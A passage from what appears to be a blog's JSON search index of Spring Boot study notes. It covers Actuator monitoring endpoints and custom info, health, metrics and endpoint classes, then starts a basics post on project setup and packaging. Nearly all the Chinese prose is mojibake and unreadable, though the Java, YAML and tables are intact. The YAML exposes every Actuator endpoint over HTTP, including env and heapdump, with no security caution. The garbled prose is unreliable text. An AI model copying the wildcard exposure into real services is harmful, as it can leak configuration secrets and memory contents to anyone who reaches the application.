¸å¿ƒä¿¡æ¯ï¼Œç›‘æ§å¹³å°ä¸­æ˜¾ç¤ºçš„ä¿¡æ¯å®é™…ä¸Šæ˜¯é€šè¿‡å¯¹è¢«ç›‘æ§çš„åº”ç”¨å‘é€è¯·æ±‚å¾—åˆ°çš„ã€‚é‚£è¿™äº›è¯·æ±‚è°å¼€å‘çš„å‘¢ï¼Ÿæ‰“å¼€è¢«ç›‘æ§åº”ç”¨çš„pomæ–‡ä»¶ï¼Œå…¶ä¸­å¯¼å…¥äº†springboot adminçš„å¯¹åº”çš„clientï¼Œåœ¨è¿™ä¸ªèµ„æºä¸­å¯¼å…¥äº†ä¸€ä¸ªåç§°å«åšactuatorçš„åŒ…ã€‚è¢«ç›‘æ§çš„åº”ç”¨ä¹‹æ‰€ä»¥å¯ä»¥å¯¹å¤–æä¾›ä¸Šè¿°è¯·æ±‚è·¯å¾„ï¼Œå°±æ˜¯å› ä¸ºæ·»åŠ äº†è¿™ä¸ªåŒ…ã€‚\n\n![](https://img.jwt1399.top/img/202209142039889.png)\n\nè¿™ä¸ªactuatoræ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™å°±æ˜¯æœ¬èŠ‚è¦è®²çš„æ ¸å¿ƒå†…å®¹ï¼Œç›‘æ§çš„ç«¯ç‚¹ã€‚\n\n> Actuatorï¼Œå¯ä»¥ç§°ä¸ºç«¯ç‚¹ï¼Œæè¿°äº†ä¸€ç»„ç›‘æ§ä¿¡æ¯ï¼ŒSpringBootAdminæä¾›äº†å¤šä¸ªå†…ç½®ç«¯ç‚¹ï¼Œé€šè¿‡è®¿é—®ç«¯ç‚¹å°±å¯ä»¥è·å–å¯¹åº”çš„ç›‘æ§ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰ç«¯ç‚¹ä¿¡æ¯ã€‚é€šè¿‡å‘é€è¯·æ±‚è·¯åŠ²**/actuator**å¯ä»¥è®¿é—®åº”ç”¨æ‰€æœ‰ç«¯ç‚¹ä¿¡æ¯ï¼Œå¦‚æœç«¯ç‚¹ä¸­è¿˜æœ‰æ˜ç»†ä¿¡æ¯å¯ä»¥å‘é€è¯·æ±‚**/actuator/ç«¯ç‚¹åç§°**æ¥è·å–è¯¦ç»†ä¿¡æ¯ã€‚\n\n| ID               | æè¿°                                                         | é»˜è®¤å¯ç”¨ |\n| ---------------- | ------------------------------------------------------------ | -------- |\n| auditevents      | æš´éœ²å½“å‰åº”ç”¨ç¨‹åºçš„å®¡è®¡äº‹ä»¶ä¿¡æ¯ã€‚                             | æ˜¯       |\n| beans            | æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¸­æ‰€æœ‰ Spring bean çš„å®Œæ•´åˆ—è¡¨ã€‚                  | æ˜¯       |\n| caches           | æš´éœ²å¯ç”¨çš„ç¼“å­˜ã€‚                                             | æ˜¯       |\n| conditions       | æ˜¾ç¤ºåœ¨é…ç½®å’Œè‡ªåŠ¨é…ç½®ç±»ä¸Šè¯„ä¼°çš„æ¡ä»¶ä»¥åŠå®ƒä»¬åŒ¹é…æˆ–ä¸åŒ¹é…çš„åŸå› ã€‚ | æ˜¯       |\n| configprops      | æ˜¾ç¤ºæ‰€æœ‰ @ConfigurationProperties çš„æ ¡å¯¹æ¸…å•ã€‚               | æ˜¯       |\n| env              | æš´éœ² Spring ConfigurableEnvironment ä¸­çš„å±æ€§ã€‚               | æ˜¯       |\n| flyway           | æ˜¾ç¤ºå·²åº”ç”¨çš„ Flyway æ•°æ®åº“è¿ç§»ã€‚                             | æ˜¯       |\n| health           | æ˜¾ç¤ºåº”ç”¨ç¨‹åºå¥åº·ä¿¡æ¯                                         | æ˜¯       |\n| httptrace        | æ˜¾ç¤º HTTP è¿½è¸ªä¿¡æ¯ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œæœ€å 100 ä¸ª  HTTP è¯·æ±‚/å“åº”äº¤æ¢ï¼‰ã€‚ | æ˜¯       |\n| info             | æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¿¡æ¯ã€‚                                           | æ˜¯       |\n| integrationgraph | æ˜¾ç¤º Spring Integration å›¾ã€‚                                 | æ˜¯       |\n| loggers          | æ˜¾ç¤ºå’Œä¿®æ”¹åº”ç”¨ç¨‹åºä¸­æ—¥å¿—è®°å½•å™¨çš„é…ç½®ã€‚                       | æ˜¯       |\n| liquibase        | æ˜¾ç¤ºå·²åº”ç”¨çš„ Liquibase æ•°æ®åº“è¿ç§»ã€‚                          | æ˜¯       |\n| metrics          | æ˜¾ç¤ºå½“å‰åº”ç”¨ç¨‹åºçš„æŒ‡æ ‡åº¦é‡ä¿¡æ¯ã€‚                             | æ˜¯       |\n| mappings         | æ˜¾ç¤ºæ‰€æœ‰ @RequestMapping è·¯å¾„çš„æ•´ç†æ¸…å•ã€‚                    | æ˜¯       |\n| scheduledtasks   | æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¸­çš„è°ƒåº¦ä»»åŠ¡ã€‚                                   | æ˜¯       |\n| sessions         | å…è®¸ä» Spring Session æ”¯æŒçš„ä¼šè¯å­˜å‚¨ä¸­æ£€ç´¢å’Œåˆ é™¤ç”¨æˆ·ä¼šè¯ã€‚å½“ä½¿ç”¨ Spring Session çš„å“åº”å¼ Web åº”ç”¨ç¨‹åºæ”¯æŒæ—¶ä¸å¯ç”¨ã€‚ | æ˜¯       |\n| shutdown         | æ­£å¸¸å…³é—­åº”ç”¨ç¨‹åºã€‚                                           | å¦       |\n| threaddump       | æ‰§è¡Œçº¿ç¨‹ dumpã€‚                                              | æ˜¯       |\n| heapdump         | è¿”å›ä¸€ä¸ª hprof å † dump æ–‡ä»¶ã€‚                                | æ˜¯       |\n| jolokia          | é€šè¿‡ HTTP æš´éœ² JMX beanï¼ˆå½“  Jolokia åœ¨ classpath ä¸Šæ—¶ï¼Œä¸é€‚ç”¨äº WebFluxï¼‰ã€‚ | æ˜¯       |\n| logfile          | è¿”å›æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚æœå·²è®¾ç½® logging.file æˆ– logging.path å±æ€§ï¼‰ã€‚æ”¯æŒä½¿ç”¨ HTTP Range å¤´æ¥æ£€ç´¢éƒ¨åˆ†æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ã€‚ | æ˜¯       |\n| prometheus       | ä»¥å¯ä»¥ç”± Prometheus æœåŠ¡å™¨æŠ“å–çš„æ ¼å¼æš´éœ²æŒ‡æ ‡ã€‚               | æ˜¯       |\n\nä¸Šè¿°ç«¯ç‚¹æ¯ä¸€é¡¹ä»£è¡¨è¢«ç›‘æ§çš„æŒ‡æ ‡ï¼Œå¦‚æœå¯¹å¤–å¼€æ”¾åˆ™ç›‘æ§å¹³å°å¯ä»¥æŸ¥è¯¢åˆ°å¯¹åº”çš„ç«¯ç‚¹ä¿¡æ¯ï¼Œå¦‚æœæœªå¼€æ”¾åˆ™æ— æ³•æŸ¥è¯¢å¯¹åº”çš„ç«¯ç‚¹ä¿¡æ¯ã€‚é€šè¿‡é…ç½®å¯ä»¥è®¾ç½®ç«¯ç‚¹æ˜¯å¦å¯¹å¤–å¼€æ”¾åŠŸèƒ½ã€‚ä½¿ç”¨enableå±æ€§æ§åˆ¶ç«¯ç‚¹æ˜¯å¦å¯¹å¤–å¼€æ”¾ã€‚å…¶ä¸­healthç«¯ç‚¹ä¸ºé»˜è®¤ç«¯ç‚¹ï¼Œä¸èƒ½å…³é—­ã€‚\n\n```yaml\nmanagement:\n  endpoint:\n    health:\t\t\t\t\t\t# ç«¯ç‚¹åç§°\n      show-details: always\n    info:\t\t\t\t\t\t  # ç«¯ç‚¹åç§°\n      enabled: true\t\t\t\t# æ˜¯å¦å¼€æ”¾\n```\n\nä¸ºäº†æ–¹ä¾¿å¼€å‘è€…å¿«é€Ÿé…ç½®ç«¯ç‚¹ï¼Œspringboot adminè®¾ç½®äº†13ä¸ªè¾ƒä¸ºå¸¸ç”¨çš„ç«¯ç‚¹ä½œä¸ºé»˜è®¤å¼€æ”¾çš„ç«¯ç‚¹ï¼Œå¦‚æœéœ€è¦æ§åˆ¶é»˜è®¤å¼€æ”¾çš„ç«¯ç‚¹çš„å¼€æ”¾çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡é…ç½®è®¾ç½®ï¼Œå¦‚ä¸‹ï¼š\n\n```yaml\nmanagement:\n  endpoints:\n    enabled-by-default: true\t# æ˜¯å¦å¼€å¯é»˜è®¤ç«¯ç‚¹ï¼Œé»˜è®¤å€¼true\n```\n\nä¸Šè¿°ç«¯ç‚¹å¼€å¯åï¼Œå°±å¯ä»¥é€šè¿‡ç«¯ç‚¹å¯¹åº”çš„è·¯å¾„æŸ¥çœ‹å¯¹åº”çš„ä¿¡æ¯äº†ã€‚ä½†æ˜¯æ­¤æ—¶è¿˜ä¸èƒ½é€šè¿‡HTTPè¯·æ±‚æŸ¥è¯¢æ­¤ä¿¡æ¯ï¼Œè¿˜éœ€è¦å¼€å¯é€šè¿‡HTTPè¯·æ±‚æŸ¥è¯¢çš„ç«¯ç‚¹åç§°ï¼Œä½¿ç”¨â€œ*â€å¯ä»¥ç®€åŒ–é…ç½®æˆå¼€æ”¾æ‰€æœ‰ç«¯ç‚¹çš„WEBç«¯HTTPè¯·æ±‚æƒé™ã€‚\n\n```yaml\nmanagement:\n  endpoints:\n    web:\n      exposure:\n        include: \"*\"\n```\n\næ•´ä½“ä¸Šæ¥è¯´ï¼Œå¯¹äºç«¯ç‚¹çš„é…ç½®æœ‰ä¸¤ç»„ä¿¡æ¯ï¼Œä¸€ç»„æ˜¯endpointså¼€å¤´çš„ï¼Œå¯¹æ‰€æœ‰ç«¯ç‚¹è¿›è¡Œé…ç½®ï¼Œä¸€ç»„æ˜¯endpointå¼€å¤´çš„ï¼Œå¯¹å…·ä½“ç«¯ç‚¹è¿›è¡Œé…ç½®ã€‚\n\n```yaml\nmanagement:\n  endpoint:\t\t# å…·ä½“ç«¯ç‚¹çš„é…ç½®\n    health:\n      show-details: always\n    info:\n      enabled: true\n  endpoints:\t# å…¨éƒ¨ç«¯ç‚¹çš„é…ç½®\n    web:\n      exposure:\n        include: \"*\"\n    enabled-by-default: true\n```\n\n**æ€»ç»“**\n\n1. è¢«ç›‘æ§å®¢æˆ·ç«¯é€šè¿‡æ·»åŠ actuatorçš„åæ ‡å¯ä»¥å¯¹å¤–æä¾›è¢«è®¿é—®çš„ç«¯ç‚¹åŠŸèƒ½\n\n2. ç«¯ç‚¹åŠŸèƒ½çš„å¼€æ”¾ä¸å…³é—­å¯ä»¥é€šè¿‡é…ç½®è¿›è¡Œæ§åˆ¶\n\n3. webç«¯é»˜è®¤æ— æ³•è·å–æ‰€æœ‰ç«¯ç‚¹ä¿¡æ¯ï¼Œé€šè¿‡é…ç½®å¼€æ”¾ç«¯ç‚¹åŠŸèƒ½\n\n\n### â‘¢è‡ªå®šä¹‰ç›‘æ§æŒ‡æ ‡\n\nç«¯ç‚¹æè¿°äº†è¢«ç›‘æ§çš„ä¿¡æ¯ï¼Œé™¤äº†ç³»ç»Ÿé»˜è®¤çš„æŒ‡æ ‡ï¼Œè¿˜å¯ä»¥è‡ªè¡Œæ·»åŠ æ˜¾ç¤ºçš„æŒ‡æ ‡ï¼Œä¸‹é¢å°±é€šè¿‡3ç§ä¸åŒçš„ç«¯ç‚¹çš„æŒ‡æ ‡è‡ªå®šä¹‰æ–¹å¼æ¥å­¦ä¹ ç«¯ç‚¹ä¿¡æ¯çš„äºŒæ¬¡å¼€å‘ã€‚\n\n#### **INFOç«¯ç‚¹**\n\ninfoç«¯ç‚¹æè¿°äº†å½“å‰åº”ç”¨çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ä¸¤ç§å½¢å¼å¿«é€Ÿé…ç½®infoç«¯ç‚¹çš„ä¿¡æ¯\n\n- é…ç½®å½¢å¼\n\n  åœ¨ymlæ–‡ä»¶ä¸­é€šè¿‡è®¾ç½®infoèŠ‚ç‚¹çš„ä¿¡æ¯å°±å¯ä»¥å¿«é€Ÿé…ç½®ç«¯ç‚¹ä¿¡æ¯\n\n  ```yaml\n  management:\n    info:\n      env:\n        enabled: true\n  info:\n    appName: @project.artifactId@\n    version: @project.version@\n    company: jianjian\n    author: xiaojian\n  ```\n\n  é…ç½®å®Œæ¯•åï¼Œå¯¹åº”ä¿¡æ¯æ˜¾ç¤ºåœ¨ç›‘æ§å¹³å°ä¸Š\n\n![](https://img.jwt1399.top/img/202209142112404.png)\n\n- ç¼–ç¨‹å½¢å¼\n\n  é€šè¿‡é…ç½®çš„å½¢å¼åªèƒ½æ·»åŠ å›ºå®šçš„æ•°æ®ï¼Œå¦‚æœéœ€è¦åŠ¨æ€æ•°æ®è¿˜å¯ä»¥é€šè¿‡é…ç½®beançš„æ–¹å¼ä¸ºinfoç«¯ç‚¹æ·»åŠ ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯ä¸é…ç½®ä¿¡æ¯å…±å­˜\n\n  ```java\n  @Component\n  public class InfoConfig implements InfoContributor {\n      @Override\n      public void contribute(Info.Builder builder) {\n          builder.withDetail(\"runTime\",System.currentTimeMillis());\t\t//æ·»åŠ å•ä¸ªä¿¡æ¯\n          Map infoMap = new HashMap();\t\t\n          infoMap.put(\"buildTime\",\"2006\");\n          builder.withDetails(infoMap);\t\t\t\t\t\t\t\t\t              //æ·»åŠ ä¸€ç»„ä¿¡æ¯\n      }\n  }\n  ```\n\n#### **Healthç«¯ç‚¹**\n\nhealthç«¯ç‚¹æè¿°å½“å‰åº”ç”¨çš„è¿è¡Œå¥åº·æŒ‡æ ‡ï¼Œå³åº”ç”¨çš„è¿è¡Œæ˜¯å¦æˆåŠŸã€‚é€šè¿‡ç¼–ç¨‹çš„å½¢å¼å¯ä»¥æ‰©å±•æŒ‡æ ‡ä¿¡æ¯ã€‚\n\n```java\n@Component\npublic class HealthConfig extends AbstractHealthIndicator {\n    @Override\n    protected void doHealthCheck(Health.Builder builder) throws Exception {\n        boolean condition = false;\n        if(condition) {\n            builder.status(Status.UP);\t\t\t\t\t//è®¾ç½®è¿è¡ŒçŠ¶æ€ä¸ºå¯åŠ¨çŠ¶æ€\n            builder.withDetail(\"runTime\", System.currentTimeMillis());\n            Map infoMap = new HashMap();\n            infoMap.put(\"buildTime\", \"2006\");\n            builder.withDetails(infoMap);\n        }else{\n            builder.status(Status.OUT_OF_SERVICE);\t\t//è®¾ç½®è¿è¡ŒçŠ¶æ€ä¸ºä¸åœ¨æœåŠ¡çŠ¶æ€\n            builder.withDetail(\"ä¸Šçº¿äº†å—ï¼Ÿ\",\"ä½ åšæ¢¦\");\n        }\n    }\n}\n```\n\nå½“ä»»æ„ä¸€ä¸ªç»„ä»¶çŠ¶æ€ä¸ä¸ºUPæ—¶ï¼Œæ•´ä½“åº”ç”¨å¯¹å¤–æœåŠ¡çŠ¶æ€ä¸ºéUPçŠ¶æ€ã€‚\n\n![](https://img.jwt1399.top/img/202209142124604.png)\n\n#### **Metricsç«¯ç‚¹**\n\nmetricsç«¯ç‚¹æè¿°äº†æ€§èƒ½æŒ‡æ ‡ï¼Œé™¤äº†ç³»ç»Ÿè‡ªå¸¦çš„ç›‘æ§æ€§èƒ½æŒ‡æ ‡ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰æ€§èƒ½æŒ‡æ ‡ã€‚\n\n```java\n@Service\npublic class BookServiceImpl extends ServiceImpl<BookDao, Book> implements IBookService {\n    @Autowired\n    private BookDao bookDao;\n\n    private Counter counter;\n\n    public BookServiceImpl(MeterRegistry meterRegistry){\n        counter = meterRegistry.counter(\"ç”¨æˆ·ä»˜è´¹æ“ä½œæ¬¡æ•°ï¼š\");\n    }\n\n    @Override\n    public boolean delete(Integer id) {\n        //æ¯æ¬¡æ‰§è¡Œåˆ é™¤ä¸šåŠ¡ç­‰åŒäºæ‰§è¡Œäº†ä»˜è´¹ä¸šåŠ¡\n        counter.increment();\n        return bookDao.deleteById(id) > 0;\n    }\n}\n```\n\nåœ¨æ€§èƒ½æŒ‡æ ‡ä¸­å°±å‡ºç°äº†è‡ªå®šä¹‰çš„æ€§èƒ½æŒ‡æ ‡ç›‘æ§é¡¹\n\n![](https://img.jwt1399.top/img/202209142118617.png)\n\n**è‡ªå®šä¹‰ç«¯ç‚¹**\n\nå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€è¦è‡ªå®šä¹‰ç«¯ç‚¹ï¼Œæ–¹ä¾¿ä¸šåŠ¡ç›‘æ§\n\n```java\n@Component\n@Endpoint(id=\"pay\",enableByDefault = true)\npublic class PayEndpoint {\n    @ReadOperation\n    public Object getPay(){\n        Map payMap = new HashMap();\n        payMap.put(\"level 1\",\"300\");\n        payMap.put(\"level 2\",\"291\");\n        payMap.put(\"level 3\",\"666\");\n        return payMap;\n    }\n}\n```\n\nç”±äºæ­¤ç«¯ç‚¹æ•°æ®spirng boot adminæ— æ³•é¢„çŸ¥è¯¥å¦‚ä½•å±•ç¤ºï¼Œæ‰€ä»¥é€šè¿‡ç•Œé¢æ— æ³•çœ‹åˆ°æ­¤æ•°æ®ï¼Œé€šè¿‡HTTPè¯·æ±‚è·¯å¾„å¯ä»¥è·å–åˆ°å½“å‰ç«¯ç‚¹çš„ä¿¡æ¯ï¼Œä½†æ˜¯éœ€è¦å…ˆå¼€å¯å½“å‰ç«¯ç‚¹å¯¹å¤–åŠŸèƒ½ï¼Œæˆ–è€…è®¾ç½®å½“å‰ç«¯ç‚¹ä¸ºé»˜è®¤å¼€å‘çš„ç«¯ç‚¹ã€‚\n\n![](https://img.jwt1399.top/img/202209142123262.png)\n\n**æ€»ç»“**\n\n1. ç«¯ç‚¹çš„æŒ‡æ ‡å¯ä»¥è‡ªå®šä¹‰ï¼Œä½†æ˜¯æ¯ç§ä¸åŒçš„æŒ‡æ ‡æ ¹æ®å…¶åŠŸèƒ½ä¸åŒï¼Œè‡ªå®šä¹‰æ–¹å¼ä¸åŒ\n2. infoç«¯ç‚¹é€šè¿‡é…ç½®å’Œç¼–ç¨‹çš„æ–¹å¼éƒ½å¯ä»¥æ·»åŠ ç«¯ç‚¹æŒ‡æ ‡\n3. healthç«¯ç‚¹é€šè¿‡ç¼–ç¨‹çš„æ–¹å¼æ·»åŠ ç«¯ç‚¹æŒ‡æ ‡ï¼Œéœ€è¦æ³¨æ„è¦ä¸ºå¯¹åº”æŒ‡æ ‡æ·»åŠ å¯åŠ¨çŠ¶æ€çš„é€»è¾‘è®¾å®š\n4. metricsæŒ‡æ ‡é€šè¿‡åœ¨ä¸šåŠ¡ä¸­æ·»åŠ ç›‘æ§æ“ä½œè®¾ç½®æŒ‡æ ‡\n5. å¯ä»¥è‡ªå®šä¹‰ç«¯ç‚¹æ·»åŠ æ›´å¤šçš„æŒ‡æ ‡\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-åŸºç¡€ç¯‡","url":"/posts/33757.html","content":"\n> åŸºç¡€ç¯‡åŒ…å«å¦‚ä½•åˆ›å»ºä¸€ä¸ªSpringBootå·¥ç¨‹ã€SpringBootçš„åŸºç¡€é…ç½®è¯­æ³•æ ¼å¼ã€å¸¸è§å®ç”¨æŠ€æœ¯æ•´åˆã€æ•´åˆç»¼åˆåº”ç”¨ã€‚\n\nå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ä¹‹ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringBoot-åŸºç¡€ç¯‡ã€‹ï¼Œä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡4å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š09-06\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š09-10\n- [x] ğŸ€æ€»ç»“ï¼šSpringBoot å¤ªå¥½äº†ï¼Œå†ä¹Ÿä¸éœ€è¦éº»çƒ¦çš„é…ç½®å•¦\n\n\n\n- å­¦ä¹ ç›®æ ‡\n\n| ç« èŠ‚                                       | å­¦ä¹ ç›®æ ‡                                                  |\n| ------------------------------------------ | --------------------------------------------------------- |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | èƒ½å¤Ÿåˆ›å»ºSpringBootå·¥ç¨‹<br/>åŸºäºSpringBootå®ç°ssm/ssmpæ•´åˆ |\n\n- å‰ç½®çŸ¥è¯†\n\n| ç« èŠ‚                                       | å‰ç½®çŸ¥è¯†                   | è¦æ±‚                                                         |\n| ------------------------------------------ | -------------------------- | ------------------------------------------------------------ |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | JavaåŸºç¡€è¯­æ³•               | é¢å‘å¯¹è±¡ï¼Œå°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€ï¼Œç±»ä¸æ¥å£ï¼Œé›†åˆï¼ŒIOï¼Œç½‘ç»œç¼–ç¨‹ç­‰   |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | Springä¸SpringMVC          | çŸ¥é“Springæ˜¯ç”¨æ¥ç®¡ç†beanï¼Œèƒ½å¤ŸåŸºäºRestfulå®ç°é¡µé¢è¯·æ±‚äº¤äº’åŠŸèƒ½ |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | Mybatisä¸Mybatis-Plus      | åŸºäºMybatiså’ŒMybatisPlusèƒ½å¤Ÿå¼€å‘å‡ºåŒ…å«åŸºç¡€CRUDåŠŸèƒ½çš„æ ‡å‡†Daoæ¨¡å— |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | æ•°æ®åº“MySQL                | èƒ½å¤Ÿè¯»æ‡‚åŸºç¡€CRUDåŠŸèƒ½çš„SQLè¯­å¥                                |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | æœåŠ¡å™¨                     | çŸ¥é“æœåŠ¡å™¨ä¸webå·¥ç¨‹çš„å…³ç³»ï¼Œç†Ÿæ‚‰webæœåŠ¡å™¨çš„åŸºç¡€é…ç½®           |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | maven                      | çŸ¥é“mavençš„ä¾èµ–å…³ç³»ï¼ŒçŸ¥é“ä»€ä¹ˆæ˜¯ä¾èµ–èŒƒå›´ï¼Œä¾èµ–ä¼ é€’ï¼Œæ’é™¤ä¾èµ–ï¼Œå¯é€‰ä¾èµ–ï¼Œç»§æ‰¿ |\n| <font color=\"#ff0000\"><b>åŸºç¡€ç¯‡</b></font> | webæŠ€æœ¯ï¼ˆå«vueï¼ŒElementUI) | çŸ¥é“vueå¦‚ä½•å‘é€ajaxè¯·æ±‚ï¼Œå¦‚ä½•è·å–å“åº”æ•°æ®ï¼Œå¦‚ä½•è¿›è¡Œæ•°æ®æ¨¡å‹åŒå‘ç»‘å®š |\n\n\n\n# ä¸€ã€å¿«é€Ÿå…¥é—¨\n\n## 1.æ‰‹åŠ¨åˆ›å»ºé¡¹ç›®\n\n### â‘ åˆ›å»ºMavenå·¥ç¨‹\n\n![](https://img.jwt1399.top/img/202209061927726.png)\n\n### â‘¡é…ç½®pomæ–‡ä»¶\n\n>ç»§æ‰¿spring-boot-starter-parentï¼›æ·»åŠ ä¾èµ–spring-boot-starter-web\n\n```xml\n<parent>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-parent</artifactId>\n  <version>2.7.0</version>\n</parent>\n\n<dependencies>\n  <dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n  </dependency>\n</dependencies>\n```\n\n### â‘¢åˆ›å»ºå¼•å¯¼ç±»\n\n```java\n@SpringBootApplication\npublic class MainApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(MainApplication.class,args);\n    }\n}\n```\n\n`@SpringBootApplication` æ³¨è§£ç›¸å½“äºä½¿ç”¨ `@Configuration`ã€`@EnableAutoConfiguration` å’Œ `@ComponentScan` åŠä»–ä»¬çš„é»˜è®¤å±æ€§\n\n-  `@Configuration`ä½œä¸ºé…ç½®ç±»æ›¿ä»£xmlé…ç½®æ–‡ä»¶\n\n- `@EnableAutoConfiguration`å¯ç”¨ SpringBoot çš„è‡ªåŠ¨é…ç½®æœºåˆ¶\n\n- `@ComponentScan` è‡ªåŠ¨æ‰«ææ‰€æœ‰ Spring ç»„ä»¶\n\n### â‘£ç¼–å†™ä¸šåŠ¡\n\n```java\n@RestController\npublic class HelloController {\n    @GetMapping\n    public String home(){\n        return \"Hello, Spring Boot 2!\";\n    }\n}\n```\n\n### â‘¤è¿è¡Œé¡¹ç›®\n\nç›´æ¥è¿è¡Œä¸»ç¨‹åº `MainApplication` ä¸­çš„ `main` æ–¹æ³•ï¼Œè®¿é—® `http://127.0.0.1:8080`ï¼Œå°†ä¼šè¾“å‡º`Hello, Spring Boot 2!`\n\n### â‘¥ç®€åŒ–éƒ¨ç½²\n\nSpring Boot åŒ…æ‹¬äº†ä¸€ä¸ª Maven æ’ä»¶ï¼Œå®ƒå¯ä»¥å°†é¡¹ç›®æ‰“åŒ…æˆä¸€ä¸ªå¯æ‰§è¡Œ jar\n\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-maven-plugin</artifactId>\n      <version>2.7.0</version>\n    </plugin>\n  </plugins>\n</build>\n```\n\nç‚¹å‡» IDEA å³ä¾§çš„ Maven â‡’ ç‚¹å‡»ç”Ÿå‘½å‘¨æœŸ â‡’ ç‚¹å‡» clean â‡’ ç‚¹å‡» packageï¼Œtarget ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ jar åŒ…ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯è¿è¡Œ jar åŒ…\n\n```bash\njava -jar springBoot-learn-1.0-SNAPSHOT.jar\n```\n\n## 2.è„šæ‰‹æ¶åˆ›å»ºé¡¹ç›®\n\n[Spring Initailizr](https://start.spring.io/)æ˜¯åˆ›å»º Spring Boot å·¥ç¨‹çš„è„šæ‰‹æ¶ï¼Œä»¥åå°±åˆ›å»º SpringBoot é¡¹ç›®å°±ä¸ç”¨åˆ›å»ºç©ºç™½Mavené¡¹ç›®ï¼Œè€Œæ˜¯åˆ›å»º Spring Initailizr é¡¹ç›®\n\nSpirngç¨‹åºç›¸æ¯”ï¼ŒSpringBootç¨‹åºåœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­å„ä¸ªå±‚é¢å‡å…·æœ‰ä¼˜åŠ¿\n\n| **ç±»é…ç½®æ–‡ä»¶**         | **Spring**   | **SpringBoot** |\n| ---------------------- | ------------ | -------------- |\n| pomæ–‡ä»¶ä¸­çš„åæ ‡        | **æ‰‹å·¥æ·»åŠ ** | **å‹¾é€‰æ·»åŠ **   |\n| web3.0é…ç½®ç±»           | **æ‰‹å·¥åˆ¶ä½œ** | **æ— **         |\n| Spring/SpringMVCé…ç½®ç±» | **æ‰‹å·¥åˆ¶ä½œ** | **æ— **         |\n| æ§åˆ¶å™¨                 | **æ‰‹å·¥åˆ¶ä½œ** | **æ‰‹å·¥åˆ¶ä½œ**   |\n\n### **â‘ åˆ›å»ºSpring Initializrå·¥ç¨‹**\n\n> åˆ›å»ºæ–°æ¨¡å—ï¼Œé€‰æ‹©Spring Initializrï¼Œå¹¶é…ç½®æ¨¡å—ç›¸å…³åŸºç¡€ä¿¡æ¯\n\nåˆ›å»ºå·¥ç¨‹æ—¶ï¼Œå¯ä»¥åˆ‡æ¢ `starter` æœåŠ¡è·¯å¾„ä¸ºé˜¿é‡Œäº‘æä¾›ç»™çš„ä½¿ç”¨åœ°å€ã€‚\n\nåœ°å€ï¼šhttp://start.aliyun.comæˆ–https://start.aliyun.com\n\n![](https://img.jwt1399.top/img/202209061917986.png)\n\n### â‘¡é€‰æ‹©æŠ€æœ¯é›†\n\n![](https://img.jwt1399.top/img/202209061922725.png)\n\n### **â‘¢ç¼–å†™ä¸šåŠ¡**\n\n```java\n@RestController\npublic class HelloController {\n    @GetMapping\n    public String home(){\n        return \"Hello, Spring Boot 2!\";\n    }\n}\n```\n\n### 